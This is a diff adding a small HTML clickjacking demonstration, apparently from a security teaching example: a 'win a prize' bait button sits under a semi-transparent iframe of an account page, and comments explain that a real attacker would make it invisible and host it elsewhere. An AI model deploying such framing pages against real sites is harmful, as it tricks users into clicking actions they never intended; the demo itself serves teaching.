@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Win a prize!</title>
+<style>
+    /* The bait, where the real button will be. */
+    .bait { position: absolute; top: 0; left: 0; width: 320px; height: 70px;
+            background: gold; font: bold 1.5em sans-serif; display: grid; place-items: center; }
+    /* Your account page, on top of the bait. An attacker sets opacity to 0;
+       it's 0.3 here so you can see what's going on. */
+    iframe { position: absolute; top: 0; left: 0; width: 400px; height: 300px;
+             border: 0; opacity: 0.3; z-index: 2; }
+</style>
+
+<div class="bait">Click here to win!</div>
+<!-- In a real attack this page is on another site. Framing works the same. -->
+<iframe src="/naive.php"></iframe>
